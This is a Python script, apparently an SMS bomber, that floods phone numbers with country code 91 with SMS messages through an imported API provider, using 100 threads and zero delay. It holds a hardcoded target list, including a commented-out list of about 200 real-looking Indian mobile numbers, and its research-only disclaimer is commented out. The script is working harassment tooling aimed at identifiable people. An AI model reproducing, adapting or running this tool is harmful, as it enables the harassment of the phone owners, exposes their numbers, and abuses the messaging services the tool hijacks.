import os
import sys
import time
import random
from api import APIProvider
from colorama import Fore, Style
from decorators import MessageDecorator
from concurrent.futures import ThreadPoolExecutor, as_completed

list = [8492840934,456,8945,456,898,469,4984,5498,9849,8492840934]

#list= [8492840935,9682617908,7006929552,6005128455,6005136837,6005196465,6005225292,6005328456,6005481285,6005578554,6005603720,6005649451,6005725212,6005738146,6005811565,6006022667,6006052696,6006078129,6006100682,6006107851,6006118568,6006124639,6006144056,6006189575,6006215832,6006224407,6006390422,6006487121,6006639587,6006656236,6006733882,6006841727,6006845970,7006039495,7006093452,7006141475,7006154767,7006182355,7006225869,7006237082,7006285567,7006438442,7006502996,7006521130,7006564439,7006602393,7006642883,7006648321,7006720594,7006727736,7006758619,7006759968,7006775727,7006888759,7006938492,7006941921,7006946132,7006950761,7051140888,7051210821,7051296899,7051347343,7051489862,7051917760,7780955576,7889309538,7889371272,7889377367,7889401019,7889422903,7889543449,7889585910,7889627316,7889675923,7889741433,7889753894,7889783798,7889805203,7889854048,7889870915,7889901414,7889915624,7889979509,8082036257,8082143907,8082343630,8082481589,8082669288,8082726788,8082779410,8082829378,8082925271,8491001901,8491850324,8492062560,8493025395,8493839726,8493858244,8494012776,8715808090,8825062502,8825071902,8899027959,8899104218,8899361018,8899630330,8899719355,9070231010,9070879999,9080689528,9086036670,9086121540,9086214979,9086221615,9086252013,9086304908,9086356976,9086611678,9086638429,9103053207,9103107061,9103120272,9103156255,9103206143,9103206241,9103255240,9103269956,9103274450,9149447157,9149514294,9149540407,9149576469,9149593143,9149728258,9149816853,9149833724,9149857957,9149861628,9149920790,9149928949,9149949600,9419123951,9419292900,9419293396,9419836841,9419933389,9469071656,9469211173,9541319901,9541477880,9541683822,9541703099,9541731473,9541858688,9541959639,9541970818,9596030378,9596858992,9596906251,9622035671,9622100198,9622224220,9622373856,9622391210,9622921680,9682127167,9682165892,9682319742,9682359878,9682368930,9682515588,9682518527,9682568574,9697026360,9697563804,9697671966,9796825430,9796896615,9797007839,9797538654,9797579433,9858002145,9858418541,9906020889,9906034590,9906044313,9906086976,9906109703,9906143793,9906393866,9906905879,9906959724]

ASCII_MODE = False
ALL_COLORS = [Fore.GREEN, Fore.RED, Fore.YELLOW, Fore.BLUE,
              Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
RESET_ALL = Style.RESET_ALL
def bann_text():
    clr()
    logo = """


   db    88     88         8888b.   dP"Yb  88b 88 888888 
  dPYb   88     88          8I  Yb dP   Yb 88Yb88 88__   
 dP__Yb  88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   
dP""'"Yb 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 


           _         __              
          /_|    /  (   _/  _  _   _ 
         (  | (_/  __)  /  (/ /  _)  
                                     
   """
    if ASCII_MODE:
        logo = ""
    
    print(random.choice(ALL_COLORS) + logo + RESET_ALL)
    print()

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
mesgdcrt = MessageDecorator("icon")
def pretty_print(cc, target, success, failed):
    requested = success+failed
    mesgdcrt.SectionMessage("Bombing is in progress - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("Target       : " + cc + " " + target)
    mesgdcrt.GeneralMessage("Sent         : " + str(requested))
    mesgdcrt.GeneralMessage("Successful   : " + str(success))
    mesgdcrt.GeneralMessage("Failed       : " + str(failed))


def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    clr()
    mesgdcrt.SectionMessage("Gearing up the Bomber - Please be patient")
    mesgdcrt.GeneralMessage(
        "Please stay connected to the internet during bombing")
    mesgdcrt.GeneralMessage("API Version   : " + api.api_version)
    mesgdcrt.GeneralMessage("Target        : " + cc + target)
    mesgdcrt.GeneralMessage("Amount        : " + str(count))
    mesgdcrt.GeneralMessage("Threads       : " + str(max_threads) + " threads")
    mesgdcrt.GeneralMessage("Delay         : " + str(delay) +
                            " seconds")
    # mesgdcrt.WarningMessage(
    #     "This tool was made for fun and research purposes only")
    # print()
    # input(mesgdcrt.CommandMessage(
    #     "Press [CTRL+Z] to suspend the bomber or [ENTER] to resume it"))

    if len(APIProvider.api_providers) == 0:
        mesgdcrt.FailureMessage("Your country/target is not supported yet")
        mesgdcrt.GeneralMessage("Feel free to reach out to us")
        input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
        bann_text()
        sys.exit()

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result is None:
                    mesgdcrt.FailureMessage(
                        "Bombing limit for your target has been reached")
                    mesgdcrt.GeneralMessage("Try Again Later !!")
                    input(mesgdcrt.CommandMessage("Press [ENTER] to exit"))
                    bann_text()
                    sys.exit()
                if result:
                    success += 1
                else:
                    failed += 1
                clr()
                pretty_print(cc, target, success, failed)
    print("\n")
    mesgdcrt.SuccessMessage("Bombing completed!")

for i in list:

    cc = "91"
    target = str(i)
    mode = "sms"
    delay = 0
    count = 2
    max_threads = 100
    workernode(mode, cc, target, count, delay, max_threads)
time.sleep(1.5)
bann_text()
sys.exit()
